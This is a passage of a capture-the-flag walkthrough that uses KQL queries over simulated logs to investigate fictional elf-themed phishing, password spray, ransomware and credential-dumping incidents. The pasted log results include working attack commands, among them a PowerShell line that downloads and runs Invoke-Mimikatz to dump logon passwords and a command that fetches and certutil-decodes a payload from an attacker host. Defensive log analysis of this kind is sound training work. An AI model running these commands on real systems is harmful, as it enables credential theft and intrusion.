database there are `90` employees stored.

| **Count** |
|-----------:|
| 90 |

**Question:** How many elves did you find?

Found 90 employees in the `NorthPoleWorkshop` database. Submitted the answer and
we were good to go!

```txt
90
```

After entering that in I got a success!

### Question 4

> You can use the where operator with the Employees table to locate a specific 
> elf. Here’s a template you can follow:

```sql
Employees
| where <field><operator><value>
```

> **Field:** The column you want to filter by (e.g., role).
>
> **Operator:** The condition you’re applying (e.g., == for an exact match).
> 
> **Value:** The specific value you’re looking for in the field (e.g., Chief 
> Elf Officer).

Question asks if we can find the name for the employee who's the Chief Toy
Maker.

**Question:** Can you find out the name of the Chief Toy Maker?

When you look at the initial output. There is a `role` field in the data
containing the employee's job title. So, I decided to use the `==` (equal to)
operator set to `Chief Toy Maker`.

```sql
Employees
| where role == "Chief Toy Maker"
```

Here is the output of the command entered with their `username`, laptop name,
and most importantly of all. Their `role` name and it its indeed `Chief Toy
Maker`. 

```json
"hire_date": 2023-11-27T00:00:00.000Z,
"name": Shinny Upatree,
"user_agent": Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36,
"ip_addr": 10.10.0.5,
"email_addr": shinny_upatree@santaworkshopgeeseislands.org,
"username": shupatree,
"role": Chief Toy Maker,
"hostname": Elf-Lap-A-Upatree,
"mfa_enabled": True,
"company_domain": santaworkshopgeeseislands.org
```

Looks like the answer to this question is `Shinny Upatree`. I've provided this
below to make copying the name easier.

```txt
Shinny Upatree
```

After entering it in. It was a success! Ten more points have been added and
we're ready to go to the next question!

### Question 5

This question seems to be going over the operators a lot. At least the ones they
feel is going to be the most useful for this challenge.

> Here are some additional operators the North Pole Cyber Defense Unit commonly 
> uses.
> 
> **==** : Checks if two values are exactly the same. Case-sensitive.
> 
> **contains** : Checks if a string appears anywhere, even as part of a word. 
> Not case-sensitive.
> 
> **has** : Checks if a string is a whole word. Not case-sensitive.
> 
> **has_any** : Checks if any of the specified words are present. Not 
> case-sensitive.
> 
> **in** : Checks if a value matches any item in a list. Case-sensitive.

**Question:** Type `operator` to continue.

The question requests that we type `operator` in the submission form and
continue to the next question.

```txt
operator
```

After entering it in. It was a success! Ten more points have been added and
we're ready to go to the next question!

### Question 6

This question refers to cross referencing information from other tables. They
want us to obtain Angel Candysalt's email from the `Employees` table and
reference it to the `Email` table.

> We can learn more about an elf by cross-referencing information from other 
> tables. Let’s take a look at Angel Candysalt’s correspondence. First, retrieve 
> her email address from the Employees table, and then use it in a query in the 
> Email table.

```sql
Email
| where recipient == "<insert Angel Candysalt’s email address here>"
| count
```

We need to figure out how many emails Angel Candysalt recieved.

**Question:** How many emails did Angel Candysalt receive?

Cross referenced the `Employees` table for the `name` Angel Candysalt.

```sql
Employees
| where name == "Angel Candysalt"
```

That outputs the following data. In the `email_addr` field is Angel's email
address. Which is `angel_candysalt@santaworkshopgeeseislands.org`. This is what
we'll need to continue with counting the emails.

```json
"hire_date": 2023-11-23T00:00:00.000Z,
"name": Angel Candysalt,
"user_agent": Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/5.0),
"ip_addr": 10.10.0.6,
"email_addr": angel_candysalt@santaworkshopgeeseislands.org,
"username": ancandysalt,
"role": Chief Reindeer Trainer,
"hostname": Elf-Lap-A-Candysalt,
"mfa_enabled": False,
"company_domain": santaworkshopgeeseislands.org
```

Then we can do a lookup on the `Email` table for how many emails Angel Candysalt
has recieved.

```sql
Email
| where recipient == "angel_candysalt@santaworkshopgeeseislands.org"
| count
```

Based on the output below. There are `31` emails that Angel has recieved.

| **Count** |
|----------:|
| 31 |

Can copy the answer from the following code block.

```txt
31
```

Got a success when entering it into the answer box. So, we're ready to move on
to the next question.

### Question 7

In this they're having us go through the `distinct` operator.

> You can use the distinct operator to filter for unique values in a specific 
> column.

Here's a start:

```sql
Email
| where sender has "<insert domain name here>"
| distinct <field you need>
| count
```

**Question:** How many distinct recipients were seen in the email logs from 
`twinkle_frostington@santaworkshopgeeseislands.org`?

```sql
Email
| where sender has "twinkle_frostington@santaworkshopgeeseislands.org"
| distinct recipient
| count
```

| **Count** |
|----------:|
| 32 |

```txt
32
```

### Question 8

> It’s time to put everything we’ve learned into action!

```sql
OutboundNetworkEvents
| where src_ip == "<insert IP here>"
| <operator> <field>
| <operator>
```

**Question:** How many distinct websites did Twinkle Frostington visit?

I didn't know what their IP was so I needed to do some back tracking.

```sql
Employees
| where name == "Twinkle Frostington"
```

```json
"hire_date": 2021-11-22T00:00:00.000Z,
"name": Twinkle Frostington,
"user_agent": Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0,
"ip_addr": 10.10.0.36,
"email_addr": twinkle_frostington@santaworkshopgeeseislands.org,
"username": twfrostington,
"role": Craftsperson Elf (Team Wombley),
"hostname": Elf-Lap-W-Frostington,
"mfa_enabled": False,
"company_domain": santaworkshopgeeseislands.org
```

```sql
OutboundNetworkEvents
| where src_ip == "10.10.0.36"
| distinct url
| count
```

| **Count** |
|----------:|
| 4 |

```txt
4
```

### Question 9

> You may have notice we’re using contains instead of has here. That’s because has will look for an exact match (the word on its own), while contains will look for the specified sequence of letters, regardless of what comes before or after it. You can try both on your query to see the difference!

```sql
PassiveDns
| where <field> contains “<value>”
| <operator> <field>
| <operator>
```

**Question:** How many distinct domains in the PassiveDns records contain the 
word green?

```sql
PassiveDns
| where domain contains "green"
| distinct domain
| count
```

| **Count** |
|----------:|
| 10 |

```txt
10
```

### Question 10

> Sometimes, you’ll need to investigate multiple elves at once. Typing each one manually or searching for them one by one isn’t practical. That’s where let statements come in handy. A let statement allows you to save values into a variable, which you can then easily access in your query.
>
> Let’s look at an example. To find the URLs they accessed, we’ll first need their IP addresses. But there are so many Twinkles! So we’ll save the IP addresses in a let statement, like this:

```sql
let twinkle_ips =
Employees
| where name has "<the name we’re looking for>"
| distinct ip_addr;
```

> This saves the result of the query into a variable. Now, you can use that result easily in another query:

```sql 
OutboundNetworkEvents  
| where src_ip in (twinkle_ips)  
| distinct <field>
```

**Question:** How many distinct URLs did elves with the first name Twinkle visit?

```sql
let twinkle_ips = Employees
| where name has "Twinkle"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (twinkle_ips)
| distinct url
| count
```

| Count |
|------:|
| 8 |

```txt
8
```

## Section 2: Operation Surrender: Alabaster's Espionage

{{< image src="microsoft-kc7/section2.png" alt="operation surrender section" position="center"  style="border-radius: 8px;" >}}

### Question 1

Eve Snowshoes approaches with a focused expression. "Welcome to Operation Surrender: Alabaster's Espionage. In this phase, Team Alabaster has executed a covert operation, and your mission is to unravel their tactics. You'll need to piece together the clues and analyze the data to understand how they gained an advantage."

**Question:** Type surrender to get started!

```txt
surrender
```

### Question 2

Team Alabaster, with their limited resources, was growing desperate for an edge over Team Wombley. Knowing that a direct attack would be costly and difficult, they turned to espionage. Their plan? A carefully crafted phishing email that appeared harmless but was designed to deceive Team Wombley into downloading a malicious file. The email contained a deceptive message with the keyword “surrender” urging Wombley’s members to click on a link.

Now, it's up to you to trace the origins of this operation.

**Question:** Who was the sender of the phishing email that set this plan into motion?

Try checking out the email table using the knowledge you gained in the previous section!

```sql
Email
| where sender contains "surrender"
```

```json
"timestamp": 2024-11-27T14:09:45.000Z,
"sender": surrender@northpolemail.com,
"reply_to": surrender@northpolemail.com,
"recipient": wombley_cube@santaworkshopgeeseislands.org,
"subject": [EXTERNAL] RE:RE: Official Surrender Notice From Camp AlaBaster,
"verdict": CLEAN,
"link": https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc

```


```txt
surrender@northpolemail.com
```

### Question 3

Team Alabaster’s phishing attack wasn’t just aimed at a single target—it was a coordinated assault on all of Team Wombley. Every member received the cleverly disguised email, enticing them to click the malicious link that would compromise their systems.

Hint: the distinct operator would help here Your mission is to determine the full scale of this operation.

How many elves from Team Wombley received the phishing email?

```sql
Employees
| where role contains "Team Wombley"
```

```sql
Email
| where sender == "surrender@northpolemail.com"
| distinct recipient
```

```txt
22
```

### Question 4

The phishing email from Team Alabaster included a link to a file that appeared legitimate to Team Wombley. This document, disguised as an important communication, was part of a carefully orchestrated plan to deceive Wombley’s members into taking the bait.

To understand the full extent of this operation, we need to identify the file where the link led to in the email.

What was the filename of the document that Team Alabaster distributed in their phishing email?

```sql
Email
| where sender == "surrender@northpolemail.com"
```

```json
"timestamp": 2024-11-27T14:09:45.000Z,
"sender": surrender@northpolemail.com,
"reply_to": surrender@northpolemail.com,
"recipient": wombley_cube@santaworkshopgeeseislands.org,
"subject": [EXTERNAL] RE:RE: Official Surrender Notice From Camp AlaBaster,
"verdict": CLEAN,
"link": https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc
```

```txt
Team_Wombley_Surrender.doc
```

### Question 5

As the phishing emails landed in the inboxes of Team Wombley, one elf was the first to click the URL, unknowingly triggering the start of Team Alabaster’s plan. By connecting the employees to their network activity, we can trace who fell for the deception first. To find the answer, you'll need to join two tables: Employees and OutboundNetworkEvents. The goal is to match employees with the outbound network events they initiated by using their IP addresses.

Here’s an example query to help you:

```sql
Employees
| join kind=inner (
    OutboundNetworkEvents
) on $left.ip_addr == $right.src_ip // condition to match rows
| where url contains "< maybe a filename :) >"
| project name, ip_addr, url, timestamp // project returns only the information you select
| sort by timestamp asc //sorts time ascending
```

This query will give you a list of employees who clicked on the phishing URL. The first person to click will be at the top of the list!

Who was the first person from Team Wombley to click the URL in the phishing email?

```sql
Employees
| join kind=inner (
    OutboundNetworkEvents
) on $left.ip_addr == $right.src_ip
| where url has "Team_Wombley_Surrender.doc"
| project name, ip_addr, url, timestamp
| sort by timestamp asc
```

```json
"name": Joyelle Tinseltoe,
"ip_addr": 10.10.0.25,
"url": https://albastersurrender.org/public/share/images/published/Team_Wombley_Surrender.doc,
"timestamp": 2024-11-27T14:11:45.000Z
```

```txt
Joyelle Tinseltoe
```

### Question 6

Once the phishing email was clicked and the malicious document was downloaded, another file was created upon execution of the .doc. This file allowed Team Alabaster to gain further insight into Team Wombley’s operations. To uncover this, you’ll need to investigate the processes that were executed on Joyelle Tinseltoe’s machine.

Your mission is to determine the name of the file that was created after the .doc was executed.

Focus on Joyelle Tinseltoe’s hostname and explore the ProcessEvents table. This table tracks which processes were started and by which machines. By filtering for Joyelle’s hostname and looking at the timestamps around the time the file was executed, you should find what you’re looking for. Here’s an example to help guide you:

```sql
ProcessEvents
| where timestamp between(datetime("2024-11-25T09:00:37Z") .. datetime("2024-11-26T17:20:37Z")) //you’ll need to modify this
| where hostname == "<Joyelle's hostname>"
```

This query will show processes that ran on Joyelle Tinseltoe’s machine within the given timeframe.

What was the filename that was created after the .doc was downloaded and executed?

```sql
Employees
| where name has "Joyelle"
```

```json
"hire_date": 2023-02-02T00:00:00.000Z,
"name": Joyelle Tinseltoe,
"user_agent": Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36,
"ip_addr": 10.10.0.25,
"email_addr": joyelle_tinseltoe@santaworkshopgeeseislands.org,
"username": jotinseltoe,
"role": Craftsperson Elf (Team Wombley),
"hostname": Elf-Lap-W-Tinseltoe,
"mfa_enabled": True,
"company_domain": santaworkshopgeeseislands.org
```

```sql
ProcessEvents
| where timestamp between(datetime("2024-11-27T14:11:45.000Z") .. datetime("2024-11-27T16:11:45.000Z"))
| where hostname == "Elf-Lap-W-Tinseltoe"
```

```json
"timestamp": 2024-11-27T14:12:44.000Z,
"parent_process_name": Explorer.exe,
"parent_process_hash": 9d8a7d433af5d645e06f6da852d0d593a750416675aff21d3d42f3243e9de1b5,
"process_commandline": Explorer.exe "C:\Users\jotinseltoe\Downloads\Team_Wombley_Surrender.doc",
"process_name": Explorer.exe,
"process_hash": 8984d7b9a5b33f56d4a3b1e2e140c9a8d19f037a252b7ffc8038e76557a963b5,
"hostname": Elf-Lap-W-Tinseltoe,
"username": jotinseltoe
```

```json
"timestamp": 2024-11-27T14:12:45.000Z,
"parent_process_name": Explorer.exe,
"parent_process_hash": a39ac00c7890ac93af341dafe839265b040d443691ea39268afb198a6f9b0269,
"process_commandline": C:\Users\Public\AppData\Roaming\keylogger.exe,
"process_name": keylogger.exe,
"process_hash": e7e7c6d6a4b5d67a90556b50e45734c8221dbf89f47913d82bd04b47162e141a,
"hostname": Elf-Lap-W-Tinseltoe,
"username": jotinseltoe
```

```txt
keylogger.exe
```

### Question 7

Team Alabaster's phishing email, sent from surrender@northpolemail.com, targeted 22 elves from Team Wombley. The email contained a malicious document named Team_Wombley_Surrender.doc, which led to the first click by Joyelle Tinseltoe.

After the document was downloaded and executed, a malicious file was created, impacting the entire Team Wombley as it ran on all their machines, giving Team Alabaster access to their keystokes!

To obtain your flag use the KQL below with your last answer!

```sql
let flag = "Change This!";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

**Question:** Enter your flag to continue

```sql
let flag = "keylogger.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

```txt
a2V5bG9nZ2VyLmV4ZQ==
```

## Section 3: Operation Snowfall: Team Wombley's Ransomware Raid

{{< image src="microsoft-kc7/section3.png" alt="operation snowfall section" position="center"  style="border-radius: 8px;" >}}

### Question 1

"Fantastic work on completing Section 2!" Eve Snowshoes, Senior Security Analyst, says with a proud smile.

"You’ve demonstrated sharp investigative skills, uncovering every detail of Team Wombley’s attack on Alabaster. Your ability to navigate the complexities of cyber warfare has been impressive.

But now, we embark on Operation Snowfall: Team Wombley’s Ransomware Raid. This time, the difficulty will increase as we dive into more sophisticated attacks. Stay sharp, and let’s see if you can rise to the occasion once again!"

Type snowfall to begin

```txt
snowfall
```

### Question 2

Team Wombley’s assault began with a password spray attack, targeting several accounts within Team Alabaster. This attack relied on repeated login attempts using common passwords, hoping to find weak entry points. The key to uncovering this tactic is identifying the source of the attack.

Authentication events can be found in the AuthenticationEvents table. Look for a pattern of failed login attempts.

Here’s a query to guide you:

```sql
AuthenticationEvents
| where result == "Failed Login"
| summarize FailedAttempts = count() by username, src_ip, result
| where FailedAttempts >= 5
| sort by FailedAttempts desc
```

What was the IP address associated with the password spray?

```sql
AuthenticationEvents
| where result == "Failed Login"
| summarize FailedAttempts = count() by username, src_ip, result
| where FailedAttempts >= 5
| sort by FailedAttempts desc
```

```json
"username": spnutmeggins,
"src_ip": 59.171.58.12,
"result": Failed Login,
"FailedAttempts": 248
```

```json
"username": twsnowfall,
"src_ip": 59.171.58.12,
"result": Failed Login,
"FailedAttempts": 248
```

```txt
59.171.58.12
```

### Question 3

After launching the password spray attack, Team Wombley potentially had success and logged into several accounts, gaining access to sensitive systems.

Eve Snowshoes weighs in: "This is where things start to get dangerous. The number of compromised accounts will show us just how far they’ve infiltrated."

How many unique accounts were impacted where there was a successful login from 59.171.58.12?

```sql
AuthenticationEvents
| where result has "Successful" and src_ip == "59.171.58.12"
| distinct username
| count
```

```txt
23
```

### Question 4

In order to login to the compromised accounts, Team Wombley leveraged a service that was accessible externally to gain control over Alabaster’s devices.

Eve Snowshoes remarks, "Identifying the service that was open externally is critical. It shows us how the attackers were able to bypass defenses and access the network. This is a common weak point in many systems."

What service was used to access these accounts/devices?

```sql
AuthenticationEvents
| where src_ip == "59.171.58.12"
| distinct description
```

```json
"description": User successfully logged onto Elf-Lap-A-Snowflakebreeze via RDP.
```

```txt
RDP
```


### Question 5

Once Team Wombley gained access to Alabaster's system, they targeted sensitive files for exfiltration. Eve Snowshoes emphasizes, "When critical files are exfiltrated, it can lead to devastating consequences. Knowing exactly what was taken will allow us to assess the damage and prepare a response."

The ProcessEvents table will help you track activities that occurred on Alabaster’s laptop. By narrowing down the events by timestamp and hostname, you’ll be able to pinpoint the file that was exfiltrated.

What file was exfiltrated from Alabaster’s laptop?

```sql
Employees
| where name has "Alabaster"
```

```json
"hire_date": 2022-04-10T00:00:00.000Z,
"name": Alabaster Snowball,
"user_agent": Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0,
"ip_addr": 10.10.0.4,
"email_addr": alabaster_snowball@santaworkshopgeeseislands.org,
"username": alsnowball,
"role": Head Elf,
"hostname": Elf-Lap-A-Snowball,
"mfa_enabled": False,
"company_domain": santaworkshopgeeseislands.org
```

```sql
AuthenticationEvents
| where username == "alsnowball"
| where result contains "success"
| where src_ip == "59.171.58.12"
```

```json
"timestamp": 2024-12-11T01:39:50.000Z,
"hostname": Elf-Lap-A-Snowball,
"src_ip": 59.171.58.12,
"user_agent": Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/47.0.1792.134 Safari/533,
"username": alsnowball,
"result": Successful Login,
"password_hash": 9ef99f00573e0e03758c2e56e32f30ab,
"description": User successfully logged onto Elf-Lap-A-Snowball via RDP.
```

```sql
ProcessEvents
| where hostname == "Elf-Lap-A-Snowball"
```

```json
"timestamp": 2024-12-16T15:09:13.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'RW5jcnlwdEV2ZXJ5dGhpbmcuZXhlIC1mIC1hRg==';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))",
"process_name": EncryptEverything.exe,
"process_hash": 8e1e6bb7f99d01a968ac064dc4b6b288a7a9b2b6b6216a21a4608f34cce3edbd,
"hostname": Elf-Lap-A-Snowball,
"username": alsnowball

```

```json
"timestamp": 2024-12-16T15:44:52.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": move C:\Users\alsnowball\Documents\Secret_Files.zip C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip,
"process_name": cmd.exe,
"process_hash": ac9a496574e56f9ce4228d2a492dca67fc1da9fba9673bd07253f6459827f0dc,
"hostname": Elf-Lap-A-Snowball,
"username": alsnowball
```


```txt
Secret_Files.zip
```

### Question 6

After exfiltrating critical files from Alabaster’s system, Team Wombley deployed a malicious payload to encrypt the device, leaving Alabaster locked out and in disarray.

Eve Snowshoes comments, "The final blow in this attack was the ransomware they unleashed. Finding the name of the malicious file will help us figure out how they crippled the system."

What is the name of the malicious file that was run on Alabaster's laptop?

```sql
ProcessEvents
| where hostname == "Elf-Lap-A-Snowball"
```

```json
"timestamp": 2024-12-16T15:09:13.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'RW5jcnlwdEV2ZXJ5dGhpbmcuZXhlIC1mIC1hRg==';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))",
"process_name": EncryptEverything.exe,
"process_hash": 8e1e6bb7f99d01a968ac064dc4b6b288a7a9b2b6b6216a21a4608f34cce3edbd,
"hostname": Elf-Lap-A-Snowball,
"username": alsnowball

```

```txt
EncryptEverything.exe
```

### Question 7

Outstanding work! You've successfully pieced together the full scope of Team Wombley’s attack. Your investigative skills are truly impressive, and you've uncovered every critical detail.

Just to recap: Team Wombley launched a cyber assault on Alabaster, beginning with a password spray attack that allowed them to gain access to several accounts. Using an external service over RDP, they infiltrated Alabaster’s system, exfiltrating sensitive files including the blueprints for snowball cannons and drones. To further their attack, Wombley executed a malicious file, which encrypted Alabaster’s entire system leaving them locked out and in chaos.

To obtain your flag use the KQL below with your last answer!

```sql
let flag = "Change This!";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

Enter your flag to continue

```sql
let flag = "EncryptEverything.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

```txt
RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl
```

## Section 4: Echos in the Frost: Tracking the Unknown Threat

{{< image src="microsoft-kc7/section4.png" alt="echos in the frost section" position="center"  style="border-radius: 8px;" >}}

### Question 1

As you close out the investigation into Team Wombley’s attack, Eve Snowshoes meets you with a serious expression. "You’ve done an incredible job so far, but now we face our most elusive adversary yet. This isn’t just another team—it’s an unknown, highly skilled threat actor who has been operating in the shadows, leaving behind only whispers of their presence. We’ve seen traces of their activity, but they’ve covered their tracks well."

She pauses, the weight of the challenge ahead clear. "This is where things get even more difficult. We’re entering uncharted territory—prepare yourself for the toughest investigation yet. Follow the clues, stay sharp, and let’s uncover the truth behind these Echoes in the Frost."

Type stay frosty to begin

```txt
stay frosty
```

### Question 2

Noel Boetie, the IT administrator, reported receiving strange emails about a breach from colleagues. These emails might hold the first clue in uncovering the unknown threat actor’s methods. Your task is to identify when the first of these suspicious emails was received.

Eve Snowshoes remarks, "The timing of these phishing emails is critical. If we can identify the first one, we’ll have a better chance of tracing the threat actor’s initial moves."

What was the timestamp of first phishing email about the breached credentials received by Noel Boetie?

```sql
Employees
| where name == "Noel Boetie"
```

```json
"hire_date": 2022-05-14T00:00:00.000Z,
"name": Noel Boetie,
"user_agent": Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36,
"ip_addr": 10.10.0.9,
"email_addr": noel_boetie@santaworkshopgeeseislands.org,
"username": noboetie,
"role": IT Helpdesk,
"hostname": Elf-Lap-A-Boetie,
"mfa_enabled": True,
"company_domain": santaworkshopgeeseislands.org
```

```sql
Email
| where recipient == "noel_boetie@santaworkshopgeeseislands.org"
| where subject contains "credentials"
```

```json
"timestamp": 2024-12-12T14:48:55.000Z,
"sender": mistletoe_jinglebellsworth@santaworkshopgeeseislands.org,
"reply_to": mistletoe_jinglebellsworth@santaworkshopgeeseislands.org,
"recipient": noel_boetie@santaworkshopgeeseislands.org,
"subject": Your credentials were found in recent breach data,
"verdict": CLEAN,
"link": https://holidaybargainhunt.io/published/files/files/echo.exe
```

```txt
2024-12-12T14:48:55Z
```

### Question 3

Noel Boetie followed the instructions in the phishing email, downloading and running the file, but reported that nothing seemed to happen afterward. However, this might have been the key moment when the unknown threat actor infiltrated the system.

When did Noel Boetie click the link to the first file?

```sql
ProcessEvents
| where hostname == "Elf-Lap-A-Boetie"
| where timestamp between (date("2024-12-12T14:48:55.000Z") .. datetime("2024-12-12T16:48:55.000Z"))
```

```json
"timestamp": 2024-12-12T15:14:38.000Z,
"parent_process_name": Explorer.exe,
"parent_process_hash": 00e563ac10db418d26a5e2bf2abbf80bfc4f7e9f4865a72dfe9ec59d26620f25,
"process_commandline": Explorer.exe "C:\Users\noboetie\Downloads\echo.exe",
"process_name": Explorer.exe,
"process_hash": dfa249867546156557f09b322999cad4f628246adca45f36f5bbe106bf6c3b73,
"hostname": Elf-Lap-A-Boetie,
"username": noboetie
```

```txt
2024-12-12T15:13:55Z
```

### Question 4

The phishing email directed Noel Boetie to download a file from an external domain.

Eve Snowshoes, "The domain and IP they used to host the malicious file is a key piece of evidence. It might lead us to other parts of their operation, so let’s find it."

What was the IP for the domain where the file was hosted?

```sql
PassiveDns
| where domain == "holidaybargainhunt.io"
```

```json
"timestamp": 2024-12-07T13:30:08.000Z,
"ip": 182.56.23.122,
"domain": holidaybargainhunt.io
```

```txt
182.56.23.122
```

### Question 5

Let’s back up for a moment. Now that we’re thinking this through, how did the unknown threat actor gain the credentials to execute this attack? We know that three users have been sending phishing emails, and we’ve identified the domain they used.

It’s time to dig deeper into the AuthenticationEvents and see if anything else unusual happened that might explain how these accounts were compromised.

Eve Snowshoes suggests, "We need to explore the AuthenticationEvents for these users. Attackers often use compromised accounts to blend in and send phishing emails internally. This might reveal how they gained access to the credentials."

Let’s take a closer look at the authentication events. I wonder if any connection events from 182.56.23.122. If so what hostname was accessed?

```sql
AuthenticationEvents
| where src_ip == "182.56.23.122"
```

```json
"timestamp": 2024-11-29T12:25:03.000Z,
"hostname": WebApp-ElvesWorkshop,
"src_ip": 182.56.23.122,
"user_agent": Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36,
"username": mijinglebellsworth,
"result": Successful Login,
"password_hash": 6a4b8f13abf0baf71d5685bdec9ee6f1,
"description": User successfully logged onto WebApp-ElvesWorkshop via RDP.
```

```txt
WebApp-ElvesWorkshop
```

### Question 6

It appears someone accessed the WebApp-ElvesWorkshop from the IP address 182.56.23.122. This could be a key moment in the attack. We need to investigate what was run on the app server and, more importantly, if the threat actor dumped any credentials from it.

Eve Snowshoes, "Accessing the web app from an external IP is a major red flag. If they managed to dump credentials from the app server, that could explain how they gained access to other parts of the system."

What was the script that was run to obtain credentials?

```sql
ProcessEvents
| where hostname == "WebApp-ElvesWorkshop"
```

```json
"timestamp": 2024-12-10T00:00:00.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::logonpasswords",
"process_name": cmd.exe,
"process_hash": acb984e77fe41893cc10827bb8c5f4d97632b9fc76b33748e947183caa48919a,
"hostname": WebApp-ElvesWorkshop,
"username": seadmin
```

```txt
Invoke-Mimikatz.ps1
```

### Question 7

Okay back to Noel, after downloading the file, Noel Boetie followed the instructions in the email and ran it, but mentioned that nothing appeared to happen.

Since the email came from an internal source, Noel assumed it was safe - yet this may have been the moment the unknown threat actor silently gained access. We need to identify exactly when Noel executed the file to trace the beginning of the attack.

Eve Snowshoes, "It’s easy to see why Noel thought the email was harmless - it came from an internal account. But attackers often use compromised internal sources to make their phishing attempts more believable."

What is the timestamp where Noel executed the file?

```sql
ProcessEvents
| where hostname == "Elf-Lap-A-Boetie"
| where timestamp between (date("2024-12-12T14:48:55.000Z") .. datetime("2024-12-12T16:48:55.000Z"))
```

```json
"parent_process_hash": 00e563ac10db418d26a5e2bf2abbf80bfc4f7e9f4865a72dfe9ec59d26620f25,
"process_commandline": Explorer.exe "C:\Users\noboetie\Downloads\echo.exe",
"process_name": Explorer.exe,
"process_hash": dfa249867546156557f09b322999cad4f628246adca45f36f5bbe106bf6c3b73,
"hostname": Elf-Lap-A-Boetie,
"username": noboetie
```

```txt
2024-12-12T15:14:38Z
```

### Question 8

After Noel ran the file, strange activity began on the system, including the download of a file called holidaycandy.hta. Keep in mind that attackers often use multiple domains to host different pieces of malware.

Eve explains, "Attackers frequently spread their operations across several domains to evade detection."

What domain was the holidaycandy.hta file downloaded from?

```sql
ProcessEvents
| where hostname == "Elf-Lap-A-Boetie"
| where timestamp between (date("2024-12-12T14:48:55.000Z") .. datetime("2024-12-12T16:48:55.000Z"))
```

```json
"timestamp": 2024-12-12T15:39:25.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": mshta.exe "C:\\Windows\\Temp\\holidaycandy.hta",
"process_name": mshta.exe,
"process_hash": 11e760b06f463291a36b6aa3a09bb09182348397ac829da6f99bd4f56111e27f,
"hostname": Elf-Lap-A-Boetie,
"username": noboetie
```

```sql
OutboundNetworkEvents
| where url contains "holidaycandy"
```

```json
"timestamp": 2024-12-12T15:39:25.000Z,
"method": GET,
"src_ip": 10.10.0.9,
"user_agent": Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36,
"url": http://compromisedchristmastoys.com/holidaycandy.hta
```

```txt
compromisedchristmastoys.com
```

### Question 9

An interesting series of events has occurred: the attacker downloaded a copy of frosty.txt, decoded it into a zip file, and used tar to extract the contents of frosty.zip into the Tasks directory.

This suggests the possibility that additional payloads or tools were delivered to Noel’s laptop. We need to investigate if any additional files appeared after this sequence.

Eve Snowshoes, "When an attacker drops files like this, it’s often the prelude to more malicious actions. Let’s see if we can find out what else landed on Noel’s laptop."

Did any additional files end up on Noel’s laptop after the attacker extracted frosty.zip?

what was the first file that was created after extraction?


```sql
ProcessEvents
| where hostname == "Elf-Lap-A-Boetie"
```

```json
"timestamp": 2024-12-24T17:18:45.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": Invoke-WebRequest -Uri "http://holidaybargainhunt.io:8080/frosty.txt" -OutFile "C:\\Windows\\Tasks\\frosty.txt"; certutil -decode "C:\\Windows\\Tasks\\frosty.txt" "C:\\Windows\\Tasks\\frosty.zip",
"process_name": powershell.exe,
"process_hash": 6414c0cd16bb83f18cd286d5049071b5a8d35cd975c51606eeff77a244a11bda,
"hostname": Elf-Lap-A-Boetie,
"username": noboetie`
```

```json
"timestamp": 2024-12-24T17:19:45.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
"process_commandline": tar -xf C:\\Windows\\Tasks\\frosty.zip -C C:\\Windows\\Tasks\\,
"process_name": tar.exe,
"process_hash": 3bd4e242cd32440912efa5769b6aee923d95f99a93182668d2a781cb72e2b4a2,
"hostname": Elf-Lap-A-Boetie,
"username": noboetie
```

```json
"timestamp": 2024-12-24T18:40:36.000Z,
"parent_process_name": cmd.exe,
"parent_process_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
